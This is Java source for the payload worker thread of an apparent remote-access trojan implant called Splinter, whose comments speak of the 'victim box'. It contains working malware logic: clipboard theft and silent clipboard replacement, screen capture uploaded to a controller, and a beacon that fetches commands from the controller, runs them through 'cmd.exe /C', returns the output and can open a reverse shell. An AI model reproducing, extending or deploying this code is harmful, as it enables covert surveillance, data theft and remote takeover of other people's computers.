/**
 * Base Template to establish interrupt procedure for worker threads and specified execution actions
 * 
 * @author Solomon Sonya 
 * 
 */

package Implant.Payloads;

import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.*;
import java.io.*;
import java.net.ConnectException;
import java.net.Socket;
import java.util.ArrayList;
import javax.*;
import javax.imageio.ImageIO;
import javax.swing.Timer;

import Controller.Drivers.Drivers;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;
import Implant.ProcessHandlerThread;
import Implant.Splinter_IMPLANT;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Sender;
import Implant.FTP.IncrementObject;

public class Worker_Thread_Payloads extends Thread implements Runnable, ActionListener
{
	public static final String strMyClassName = "Worker_Thread_Payloads";
	
	Timer tmrInterrupt = null;
	int timerInterrupt_millis = 1000;
	
	public boolean killThisThread = false;
	
	Splinter_IMPLANT implant = null;
	
	boolean dismissInterrupt = false;
	
	public int payload_execution_index = 0;
	
	public static final int PAYLOAD_CLIPBOARD_EXTRACTION = 0;
	public static final int PAYLOAD_CLIPBOARD_INJECTION = 1;
	public static final int PAYLOAD_RECORD_SCREEN = 2;
	public static final int PAYLOAD_BEACON_TO_CONTROLLER = 3;
	public static final int PAYLOAD_RENDER_SCREEN = 4;
	
	public static final String [] arrPayloadTypes = {
														"CLIPBOARD EXTRACTION",
														"CLIPBOARD INJECTION",
														"RECORD SCREEN",
														"BEACON TO CONTROLLER",
														"RENDER SCREEN"
													};
	
	public static volatile boolean TERMINATE_ALL_WORKERS_CLIPBOARD = false;
	public static volatile boolean TERMINATE_ALL_WORKERS_RECORD_SCREEN = false;
	public static volatile boolean TERMINATE_ALL_WORKERS_BEACON_TO_CONTROLLER = false;
	public static volatile boolean TERMINATE_ALL_WORKERS_RENDER_SCREEN = false;
	
	public ArrayList<String> alCommands = new ArrayList<String>();
	
	public String payloadType = "";
	
	
	
	//
	//Clipboard Extraction
	//
	public String prev_ClipboardContents = "", curr_ClipboardContents = "", text_to_inject_into_clipboard = ""; 
	public String char_sequence_to_match_clipboard_before_injection = null;
	public boolean char_sequence_match_enabled_for_clipboard_injection = false;
	public String new_clipboard_text_after_selective_injection = "";
	
	
	//
	//Record Screen
	//
	public String controllerAddress = "";
	public int controllerPort = 1; 
	
	//
	//Beacon
	//
	public String myUniqueConfirmationID = "";
	int numEntriesBufferedFromCommands = 0;
	Splinter_IMPLANT shell = null;
	
	//
	//Render Screen
	//
	public File fleRenderDirectory = null;
	public Frame_Render_Captured_Screen screenRecord = null;
	public Thread_Terminal myTerminal = null;
	
	
	public Worker_Thread_Payloads(int timing_millis, Splinter_IMPLANT agent, int payload_index, String clipboard_injection_text, String addr_controller, int port_controller, File directoryToRendor, String clipboard_injector_replacement_text)
	{
		try
		{
			if(timing_millis < 100)
				timing_millis = 100;
			
			if(clipboard_injection_text == null)
				clipboard_injection_text = "";
			
			implant = agent;
			timerInterrupt_millis = timing_millis;
			payload_execution_index = payload_index;
			payloadType = arrPayloadTypes[payload_index];
			text_to_inject_into_clipboard = clipboard_injection_text;
			fleRenderDirectory = directoryToRendor;
			char_sequence_to_match_clipboard_before_injection = clipboard_injector_replacement_text;
			
			if(payload_index == PAYLOAD_CLIPBOARD_INJECTION && char_sequence_to_match_clipboard_before_injection != null && !char_sequence_to_match_clipboard_before_injection.trim().equals(""))
			{
				char_sequence_match_enabled_for_clipboard_injection = true;
			}
			
			
			this.controllerAddress = addr_controller;
			this.controllerPort = port_controller;
					
			
			
			killThisThread = false;
			this.dismissInterrupt = false;
			
			//
			//
			//
			if(payload_index == PAYLOAD_CLIPBOARD_EXTRACTION || payload_index == PAYLOAD_CLIPBOARD_INJECTION)
			{
				TERMINATE_ALL_WORKERS_CLIPBOARD = false;
			}
			
			if(payload_index == PAYLOAD_RECORD_SCREEN)
			{
				TERMINATE_ALL_WORKERS_RECORD_SCREEN = false;
			}
			
			if(payload_index == PAYLOAD_BEACON_TO_CONTROLLER)
			{
				TERMINATE_ALL_WORKERS_BEACON_TO_CONTROLLER = false;
			}
			
			if(payload_index == PAYLOAD_RENDER_SCREEN)
			{
				TERMINATE_ALL_WORKERS_RENDER_SCREEN = false;
			}
			
			//
			//all is well, start the thread
			//
			this.start();
			
		}
		catch(Exception e)
		{
			Driver.eop("Null Constructor", strMyClassName, e, "", false);
			killThisThread = true; //error, do not run
		}
		
		
	}
	
	public void run()
	{
		try
		{
			if(!killThisThread)
			{
				//
				//if this is a beacon, attempt to beacon out immediately and then establish timer to wait
				//
				if(this.payload_execution_index == this.PAYLOAD_BEACON_TO_CONTROLLER)
				{
					beaconToController(this.controllerAddress, this.controllerPort);
				}
				
				//start the timer
				this.tmrInterrupt = new Timer(this.timerInterrupt_millis, this);
				tmrInterrupt.start();
				
				//NO ERRORS, REPORT SUCCESS TO CONTROLLER
				double interruptDelay = timerInterrupt_millis + 0.0;
				String notification = "\nWorker Thread Started for " + payloadType + " interrupt interval: " +  interruptDelay/1000 + " second(s)\n";
				
				this.sendToController(notification);
				Driver.sop(notification);
			}
			else
			{
				this.sendToController("UNABLE TO START WORKER THREAD!!!");
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("run", strMyClassName, e, "", false);
		}
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == this.tmrInterrupt)
			{
				//
				//ENSURE NOT TIME TO KILL ALL WORKER THREADS OF SAME TYPE
				//
				if(TERMINATE_ALL_WORKERS_CLIPBOARD && (payload_execution_index == PAYLOAD_CLIPBOARD_EXTRACTION || payload_execution_index == PAYLOAD_CLIPBOARD_INJECTION))
				{
					//simply indicate to kill this thread, then pop out of intrrupt
					killThisThread = true;
					
					String kill = "* Worker Thread Kill command received for all " + this.payloadType + " payload types.";
					this.sendToController(kill);
					Driver.sop(kill);
				}
				
				if(TERMINATE_ALL_WORKERS_RECORD_SCREEN && payload_execution_index == PAYLOAD_RECORD_SCREEN)
				{
					//simply indicate to kill this thread, then pop out of intrrupt
					killThisThread = true;
					
					String kill = "* * Worker Thread Kill command received for all " + this.payloadType + " payload types.";
					this.sendToController(kill);
					Driver.sop(kill);
				}
				
				if(TERMINATE_ALL_WORKERS_BEACON_TO_CONTROLLER && payload_execution_index == PAYLOAD_BEACON_TO_CONTROLLER)
				{
					//simply indicate to kill this thread, then pop out of intrrupt
					killThisThread = true;
					
					String kill = "* * Worker Thread Kill command received for all " + this.payloadType + " payload types.";
					this.sendToController(kill);
					Driver.sop(kill);
				}
				
				
				if(TERMINATE_ALL_WORKERS_RENDER_SCREEN && payload_execution_index == PAYLOAD_RENDER_SCREEN)
				{
					//simply indicate to kill this thread, then pop out of intrrupt
					killThisThread = true;
					
					String kill = "* * Worker Thread Kill command received for all " + this.payloadType + " payload types.";
					//this.sendToController(kill);
					Driver.sop(kill);
				}
				
				//
				////IS IT TIME TO HALT THIS WORKER THREAD?
				//				
				if(killThisThread)
				{
					String kill = "Kill command confirmed. starving this thread softly...";
					this.sendToController(kill);
					Driver.sop(kill);
					
					try
					{
						this.tmrInterrupt.stop();
					}catch(Exception e){}
				}
				
				//
				//ELSE, EXECUTE INTERRUPT
				//
				if(!this.dismissInterrupt)
				{
					dismissInterrupt = true;									
					
					//process the interrupt by checking the appropriate action
					executeAction(payload_execution_index);
					
					//done, release semophore flag
					dismissInterrupt = false;
				}
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("AE", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}
	
	public boolean executeAction(int execution_index)
	{
		try
		{
			//determine payload execution action
			switch(execution_index)
			{
				case PAYLOAD_CLIPBOARD_EXTRACTION:
				{					
					extract_or_inject_Clipboard("");
					break;
				}
				
				case PAYLOAD_CLIPBOARD_INJECTION:
				{
					extract_or_inject_Clipboard(this.text_to_inject_into_clipboard);
					break;
					
				}
				
				case PAYLOAD_RECORD_SCREEN:
				{
					recordScreen(this.controllerAddress, this.controllerPort);					
					break;
				}
			
				case PAYLOAD_BEACON_TO_CONTROLLER:
				{
					beaconToController(this.controllerAddress, this.controllerPort);					
					break;
				}
				
				case PAYLOAD_RENDER_SCREEN:
				{
					scanDirectory_RenderScreen(fleRenderDirectory);					
					break;
				}
				
				default:
				{
					Driver.sop("Unknown execution action received in " + strMyClassName);
					return false;
				}			
			}
			
			
			
			
			return true;
		}
		
		catch(Exception e)
		{
			Drivers.eop("executionAction", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	
	/****************************************************************************************
	 * 
	 * 
	 * 
	 * 
	 * 
	 * CUT LINE, EVERYTHING ABOVE IS THE TRUE WORKER THREAD, BELOW
	 * 
	 * 
	 * 
	 * 
	 * 
	 * 
	 * 
	 * 
	 *****************************************************************************************/
	
	public boolean scanDirectory_RenderScreen(File fleDirectory)
	{
		try
		{
			if(fleDirectory == null || !fleDirectory.exists() || !fleDirectory.isDirectory())
			{
				Driver.sop("INVALID SCREEN DIRECTORY SPECIFIED!!!");
				Driver.sop("I am terminating this Worker thread...");
				this.killThisThread = true;
				return false;
			}
			
			if(this.killThisThread)
			{
				return false;
			}
			
			if(screenRecord == null || !screenRecord.isDisplayable() || !screenRecord.isShowing())
			{
				if(screenRecord != null)
				{
					try
					{
						screenRecord.dispose();
					}catch(Exception e){}
				}
				
				try
				{
					screenRecord = new Frame_Render_Captured_Screen("SCREEN SCRAPE - " + this.myTerminal.getChatJListData(), fleDirectory, true, this);
				}
				catch(Exception e)
				{
					Driver.sop("\n* * * * *Attempting alternate screen renderer for screen scrape!!! \n\n");
					screenRecord = new Frame_Render_Captured_Screen("* * * SCREEN SCRAPE * * *", fleDirectory, true, this);
				}
				screenRecord.myWorkerThread = this;
				screenRecord.myTerminal = this.myTerminal;
				screenRecord.setVisible(true);
			}
			
			else//renderer is valid, conduct a new scan!
			{
				screenRecord.scanDirectory(fleDirectory);
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("scanDirectory_RenderScreen", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean beaconToController(String addr, int port)
	{
		try
		{
			//
			//First ensure we have registered with controller
			//
			//if(implant.randomNumberReceived == null || implant.randomNumberReceived.trim().equals(""))
			if(implant.confirmation_agent_ID_from_CONTROLLER == null || implant.confirmation_agent_ID_from_CONTROLLER.trim().equals(""))
			{
				//we have not registered, so register with controller first and then sleep til the next interrupt
				registerWithController(addr, port);
			}
			else
			{
				//now with registration complete, connect to download command execution list
				if(authenticateWithController(addr, port))
				{
					//connection successful and authentication complete, acquire and execute command list
					acquireCommandList(addr, port);
				}
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("beaconToController", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean authenticateWithController(String addr, int port)
	{
		try
		{
			Driver.sop("\n" + Driver.getTimeStamp_Without_Date() + "  Attempting to establish socket to " + addr + " : " + port + "...");
			
			//open the socket connection!!!
			implant.sktMyConnection = new Socket(addr, port);
			
			//APPEARS WE HAVE A NEW CONNECTION, VERIFY IT'S NOT NULL
			if(implant.sktMyConnection == null)
			{
				throw new Exception("null socket returned!. Contact Solo and ref error Code 20130203");//this should never happen
			}
			
			//
			//Connection established, register with controller
			//do this because each hop adds its own implant ID, e.g. even a relay will add a new implant ID, but we must keep the associated implant ID from the controller
			//
			Driver.sop("Successful connection:  Awaiting registration with controller now...");
				
			//
			//Get temporal implant ID - just the association ID between the implant and the next hop
			//
			implant.listenToSocket(implant.sktMyConnection);
			
			
			return true;
		}
		catch(ConnectException ee)
		{
			Driver.sop("\nConnection Failed!  Unable to establish socket with " + addr + " : " + port + "\n");
		}
		catch(Exception e)
		{
			Driver.eop("authenticateWithController", strMyClassName, e, "", true);
		}
		
		return false;
	}
	
	public boolean registerWithController(String addr, int port)
	{
		try
		{
			//
			//Ensure no longering connections
			//
			if(implant.sktMyConnection != null)
			{
				try	{	implant.sktMyConnection.close();	}	catch(Exception e){}				
			}
			
			//
			//Establish connection with controller
			//
			Driver.sp("\n" + Driver.getTimeStamp_Without_Date() + " - Attempting to connect to \"" + addr + ":" + port + "\"...");
			
			if(addr != null && addr.trim().equalsIgnoreCase("localhost"))
			{
				addr = "127.0.0.1";
			}
			
			//
			//AUTHENTICATE WITH CONTROLLER
			//
			boolean success = authenticateWithController(addr, port);
			
			if(!success)
			{
				//Unable to establish a connection, do not continue below for registration
				return false;
			}
			
			//
			//request confirmation of implant ID
			//
			//this.sendToController(Driver.REQUEST_IMPLANT_REGISTRATION);
			
			Driver.sop("Initial registration complete. Registration value: " + implant.randomNumberReceived + " awaiting confirmation notification...");
			
			String confirmation = implant.brIn.readLine();
			
			implant.determineCommand(confirmation);
						
			Driver.sop("Confirmation Complete. ID stored: " + implant.confirmation_agent_ID_from_CONTROLLER + "\n");
			
			this.myUniqueConfirmationID = implant.confirmation_agent_ID_from_CONTROLLER;
			
			//new mtd starts from below!
			
			//
			//close socket!
			//
			implant.sktMyConnection.close();
			
			//
			//Download and execute commands, and provide response back to controller
			//
//acquireCommandList(addr, port);
			
			return true;
		}
		catch(ConnectException ce)
		{			
			Driver.sop("Unable to establish connection to \"" + addr + ":" + port + "\".  Sleeping now and upon wake, try connection again...");
		}
		
		catch(Exception e)
		{
			Driver.eop("registerWithController", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	/**
	 * Assumes socket is already opened!
	 * @return
	 */
	public boolean acquireCommandList(String addr, int port)
	{
		try
		{
			//
			//Request new Command list
			//
			Driver.sop("--> Sending request for new command list to controller now...");
			this.sendToController(Driver.REQUEST_BEACON_COMMAND_LIST + Driver.delimeter_1 + myUniqueConfirmationID + Driver.delimeter_2 + Driver.getHandshakeData(Driver.delimeter_1));
			
			//
			//Download command list
			//
			String line = "";
			alCommands.clear();
			while((line = implant.brIn.readLine()) != null && !line.equals(Driver.BEACON_END_COMMAND_UPDATE))
			{
				alCommands.add(line);
			}
			
						
			//
			//Determine commands received
			//
			if(alCommands.size() < 1)
			{
				Driver.sop("No commands received from this beacon");
			}
			else
			{
				Driver.sop("" + alCommands.size() + " commands received from controller. Executing statements now...");
			}
			
			//
			//Close Socket Connection
			//
			Driver.sop("Closing Socket...");
			implant.sktMyConnection.close();
			
			//
			//PROCES RECEIVED COMMANDS
			//
			if(alCommands.size() > 0)
			{
				Driver.sop("Executing received commands...");
				processCommands(alCommands, addr, port, true);
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("acquireCommandList", strMyClassName, e, "", false);
		}
		
		return false;
		
	}
	
	
	public boolean processCommands(ArrayList<String> commands, String addr, int port, boolean execute_commands_in_series)
	{
		try
		{
			if(commands == null ||commands.size() < 1)
			{
				Driver.sop("No commands to process at this time.");
				return true;
			}
			
			//else, execute each command
			String commandLine = "";
			String [] arrCmd = null;
			boolean shortcutFound = false;
			ArrayList<String> allCmds = new ArrayList<String>(); 
			numEntriesBufferedFromCommands = 0;
			for(int i = 0; i < commands.size(); i++)
			{
				try
				{
					//	[0] == BEACON COMMAND
					//	[1] == EXECUTABLE COMMAND OR SHORTCUT
					shortcutFound = false;
					arrCmd = commands.get(i).split(Driver.delimeter_1);
					
					//CHECK IF COMMAND IS A SHORTCUT FIRST
					for(int j = 0; j < Driver.arrShortCuts.length; j++)
					{
						if(Driver.arrShortCuts[j].equalsIgnoreCase(arrCmd[1].trim()))
						{
							shortcutFound = true;//we found an acceptable shortcut
							processShortcut(arrCmd);
						}
					}
					
					//otherwise, try and execute the statement and return results back to controller
					if(!shortcutFound)
					{
						if(execute_commands_in_series)
						{
							ArrayList<String> buffer = bufferCommands(arrCmd[1]);
							
							if(buffer == null)
								continue;
							
							//
							//add commands to main buffer
							//
							for(int k = 0; k < buffer.size(); k++)
							{
								allCmds.add(buffer.get(k));
								
								++numEntriesBufferedFromCommands;
								
								if(numEntriesBufferedFromCommands%2==0)
								{
									Driver.sp(".");
								}
							}
							
						}
						else
						{
							executeCommand(arrCmd[1], addr, port, execute_commands_in_series);
						}
						
					}
					
					
				}
				catch(Exception e){continue;}
				
			}
			
			//
			//add terminating char to the buffer so controller know to terminate connection
			//			
			allCmds.add(Driver.SPLINTER_BEACON_END_DATA_TRANSFER);
			
			//just buffered all commands, now send everything to the controller
			sendBufferedCommandsToController(allCmds, addr, port);
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("processCommands", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean processShortcut(String []cmd)
	{
		try
		{
			if(cmd == null)
			{
				return false;
			}
			
			if(cmd.length < 2)
			{
				Driver.sop("invalid shortcut command received!");
				return false;
			}
			
			if(cmd[1].trim().equalsIgnoreCase(Driver.BEACON_SHORTCUT_ESTABLISH_SHELL))
			{
				//only send a shell back if we're not already established to the controller
				if(this.shell == null || shell.sktMyConnection == null || shell.sktMyConnection.isClosed())
				{			
					Driver.sop("Establishing shell to controller now!");
					shell = new Splinter_IMPLANT(controllerAddress, controllerPort, false, false, 1);
					shell.i_am_called_from_beacon_agent = true;
					shell.start();
				}
				else
				{
					Driver.sop("\nDISMISSING ESTABLISH SHELL SHORTCUT - SHELL ALREADY ESTABLISHED WITH CONTOLLER\n");
				}
			}
			
			else
			{
				Driver.sop("Invalid or unsupported shortcut command received!!!");
			}
			
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("processShortcut", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public ArrayList<String> bufferCommands(String command)
	{
		try
		{
			if(command == null || command.trim().equals(""))
			{
				return null;
			}
			
			/*ArrayList<String> al = new ArrayList<String>();
			
			al.add("************************************************************************************");
			al.add("* Responding to command: " + command);
			al.add("************************************************************************************");*/


			Process proc = Runtime.getRuntime().exec("cmd.exe /C " + command, null, Driver.fleCurrentWorkingDirectory);
			BufferedReader brIn_WorkerThread = new BufferedReader(new InputStreamReader(proc.getInputStream()));
			ArrayList<String> alCommandsReceived = ProcessHandlerThread.getBufferedArrayList(brIn_WorkerThread, false);

			//send output back to Controller
			if(alCommandsReceived == null || alCommandsReceived.size() <1)
			{
				alCommandsReceived = new ArrayList<String>();
				alCommandsReceived.add("No process data to return!");				
			}
			/*else
			{
				//SEND ALL BUFFERED DATA
				for(int i = 0; i < alCommandsReceived.size(); i++)
				{
					al.add(alCommandsReceived.get(i));
				}	
			}*/
			
			
			alCommandsReceived.add(0, "******************************************************************************************************************");
			alCommandsReceived.add(1, "* Implant ID: [" + myUniqueConfirmationID + "] \tResponding to command: " + command);
			alCommandsReceived.add(2, "******************************************************************************************************************");

			
			return alCommandsReceived;
		}
		catch(Exception e)
		{
			Driver.eop("bufferCommands", strMyClassName, e, "", false);
		}
		
		return null;
	}
	
	public boolean sendBufferedCommandsToController(ArrayList<String> alResonseFromCommands, String addr, int port)
	{
		try
		{
			if(alResonseFromCommands == null || alResonseFromCommands.size() < 1)
			{
				return true;
			}
			
			//
			//indicate to provide response this time
			//
			implant.beacon_provide_response = true;
			
			//else, open a socket, authenticate, then provide responses back to controller
			boolean success = authenticateWithController(addr, port);
			
			//Driver.sp("\n...Providing buffered feedback now...");
			int numLinesSent = 0;
			
			if(success)
			{
				Driver.sop("Connection appears to be open, attempting to send buffered commands now...");
				
				//
				//SEND HANDSHAKE
				//
				sendToController(Driver.HANDSHAKE + Driver.getHandshakeData(Driver.delimeter_1));
				
				//
				//Connection is opened, exeute command, send across socket, then close again
				//
				for(int i = 0; i < alResonseFromCommands.size(); i++)
				{
					sendToController(alResonseFromCommands.get(i));
					
					++numLinesSent;
					
					if(numLinesSent%2 == 0)
					{
						Driver.sp(".");
					}
				}
													
					
			}
			else
			{
				Driver.sop("\n NOPE --> DISMISSING COMMAND: UNABLE TO OPEN SOCKET TO CONTROLLER AT " + addr + " : " + port);
			}
			
			//
			//Close Socket Connection
			//
			Driver.sop("\nTransmission complete. Closing socket...");
			//implant.sktMyConnection.close();
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendBufferedCommandsToController", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean executeCommand(String command, String addr, int port, boolean executeCommands_in_series)
	{
		try
		{
			if(command == null || command.trim().equals(""))
			{
				return true;
			}
			
			//
			//indicate to provide response this time
			//
			implant.beacon_provide_response = true;
			
			//else, open a socket, authenticate, then provide responses back to controller
			boolean success = authenticateWithController(addr, port);
			
			if(success)
			{
				Driver.sop("Connection appears to be open, attempting to execute command: " + command);
				
				//
				//Connection is opened, exeute command, send across socket, then close again
				//
				
				//
				//NOTIFY CONTROLLER
				//
				implant.sendToController("************************************************************************************ ", false, false);
				implant.sendToController("* Responding to command: " + command, false, false);
				implant.sendToController("************************************************************************************ ", false, false);
				
				//
				//EXECUTE COMMAND
				//
				/**
				 * PROBLEM
				 * if we keep the execution line: implant.executeCommand(command);
				 * the execution action is fine, however, the response may be mixed up bcs it is provided by separate worker threads
				 * instead, we'll execute each statement, save into an arraylist, and return the contents of each arraylist separately
				 * at least this way, we can serialize the response instead of it being returned in parallel
				 */				
				//
				//EXECUTE COMMAND IN SERIES
				//
				if(executeCommands_in_series)
				{
					//
					//POTENTIAL BUFFEROVERFLOW EXISTS
					//									
					
					Process proc = Runtime.getRuntime().exec("cmd.exe /C " + command, null, Driver.fleCurrentWorkingDirectory);
					BufferedReader brIn_WorkerThread = new BufferedReader(new InputStreamReader(proc.getInputStream()));
					ArrayList<String> alCommandsReceived = ProcessHandlerThread.getBufferedArrayList(brIn_WorkerThread, false);
					
					//send output back to Controller
					if(alCommandsReceived == null || alCommandsReceived.size() <1)
					{
						sendToController("No process data to return!");					
					}
					else
					{
						//SEND ALL BUFFERED DATA
						for(int i = 0; i < alCommandsReceived.size(); i++)
						{
							implant.sendToController(alCommandsReceived.get(i), false, false);
						}	
					}
					
					
				}
				
				//
				//EXECUTE COMMAND IN PARALLEL
				//
				else
				{
					//
					//EXECUTE COMMAND IN PARALLEL
					//
					implant.executeCommand(command);
				}
				
				
				
				//
				//Execution complete, close the socket
				//
			}
			else
			{
				Driver.sop("\nDISMISSING COMMAND: UNABLE TO OPEN SOCKET TO CONTROLLER AT " + addr + " : " + port);
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("executeCommand", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean recordScreen(String addr, int port)
	{
		try
		{
			if(addr == null || port < 1)
			{
				this.sendToController("Terminating record screen payload, invalid FTP address received");				
				this.killThisThread = true;								
				return false;
			}
			
			//otherwise, we hopefully have a valid address, capture and send to controller
			ArrayList<File> alToSend = CaptureScreen.captureScreens(Driver.systemMap.strTEMP, "record");
			
			if(alToSend == null || alToSend.size() < 1)
			{
				return false;//error!
			}
			
			//otherwise, we have one or more screens, send them!
			IncrementObject statusIncrement = null;
			try	{	statusIncrement =	new IncrementObject((double)(100.0/alToSend.size()));	}catch(Exception e){statusIncrement = null;}
			
			for(int i = 0; i < alToSend.size(); i++)
			{
				if(alToSend.get(i) == null || !alToSend.get(i).exists() || !alToSend.get(i).isFile() || alToSend.size() < 1)
				{
					Driver.sop("Empty file received at index " + i + "... skipping this result");
					continue;
				}
				
				FTP_Thread_Sender[] arrFTP_Sender = new FTP_Thread_Sender[alToSend.size()];
				arrFTP_Sender[i] = new FTP_Thread_Sender(true, false, addr, port, FTP_ServerSocket.maxFileReadSize_Bytes, alToSend.get(i), implant.pwOut, true, FTP_ServerSocket.FILE_TYPE_SCREEN_CAPTURES, statusIncrement);
				arrFTP_Sender[i].start();
			}
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("recordScreen", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	/**
	 * to reduce cycles on the victim box, only perform the action if contents have changed since last interrupt
	 * @return
	 */
	public boolean extract_or_inject_Clipboard(String injection_text)
	{
		try
		{
			//
			//grab current clipboard contents
			//
			curr_ClipboardContents = ClipboardPayload.getClipboardText();
				
			//
			//Ensure no error condition found, if so, it will continue to propogate errors, therefore kill the thread
			//			
			/*if(curr_ClipboardContents != null && curr_ClipboardContents.trim().equalsIgnoreCase(Driver.NO_TEXT_RESPONSE_CLIPBOARD_ERROR))
			{
				sendToController("Clipboard Extraction is reporting problems. I am terminating worker thread to prevent propogation of exceptions...");
				TERMINATE_ALL_WORKERS_CLIPBOARD = true;
				return true;
			}*/
			
			//
			//normalize injection text
			//
			if(injection_text == null)
				injection_text = "";
			
			//
			//normalize clipboard contents
			//
			if(prev_ClipboardContents == null)
			{	prev_ClipboardContents = "";		}
			if(curr_ClipboardContents == null)
			{	curr_ClipboardContents = "";		}
					
			//
			//Compare if injection text has changed, 
			//
			if(this.payload_execution_index == PAYLOAD_CLIPBOARD_INJECTION && !curr_ClipboardContents.trim().equals(injection_text))
			{
				//check if we are selectively injecting here via the char sequence matching first
				if(char_sequence_match_enabled_for_clipboard_injection)
				{
					//only inject portion that is to be changed if present
					if(curr_ClipboardContents != null && char_sequence_to_match_clipboard_before_injection != null && !char_sequence_to_match_clipboard_before_injection.trim().equals("") && curr_ClipboardContents.trim().toUpperCase().contains(char_sequence_to_match_clipboard_before_injection.trim().toUpperCase()))
					{
						//inject new characters
						new_clipboard_text_after_selective_injection = curr_ClipboardContents.replace(char_sequence_to_match_clipboard_before_injection.trim(), injection_text);
						
						//specific sequence found, notify controller, and then inject the clipboard
						implant.sendToController("Selective Clipboard Injection Enabled. Sequence found.  Replacing current clipboard contents \"" + curr_ClipboardContents + "\"" + " --> \"" + new_clipboard_text_after_selective_injection + "\"", false, false);
						
						//inject new text!
						ClipboardPayload.injectClipboard(new_clipboard_text_after_selective_injection);
						
						//reset the current clipboard text once again
						//curr_ClipboardContents = new_clipboard_text_after_selective_injection;
					}
				}
				else//blanket injection because clipboard contents have now changed
				{
					//inject the text here!
					ClipboardPayload.injectClipboard(injection_text);
				}
				
			}
			
			//
			//Compare, only execute action if clipboard contents have changed since the last send update
			//
			else if(curr_ClipboardContents.trim().equals(prev_ClipboardContents.trim()) || curr_ClipboardContents.equals(Driver.NO_TEXT_RESPONSE_CLIPBOARD))
			{
				//contents are the same as of the last interrupt, exit out!
				return true;
			}
			
			//else, we have new contents than previous interrupt, either send the new text, or inject into the clipboard
			
			//
			//Contents have changed, determine if we are injecting or extracting
			//
			if(this.payload_execution_index == PAYLOAD_CLIPBOARD_EXTRACTION)
			{
				
				//send extracted text to controller!
				if(implant != null)
				{
					implant.sendToController(implant.myUniqueDelimiter  + Driver.delimeter_1 + Driver.RESPONSE_CLIPBOARD + Driver.delimeter_1 + curr_ClipboardContents, false, false);
				}
			}
			
			else if(this.payload_execution_index == PAYLOAD_CLIPBOARD_INJECTION)
			{
				//inject the text here!
				//ClipboardPayload.injectClipboard(injection_text);
				
				//SOLO, DON'T COME HERE, FIND THE CONTROL SEQUENCE IF STATEMENT ABOVE!
			}
			
			
			//set the new clipboard contents
			prev_ClipboardContents = curr_ClipboardContents;
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("extract_or_inject_Clipboard", strMyClassName, e, "", true);
		}
		
		return false;
	}
	
	
	
	public boolean sendToController(String strToSend)
	{
		try
		{
			if(implant != null)
			{
				implant.sendToController(strToSend, false, false);				
			}
						
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendToController", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
}
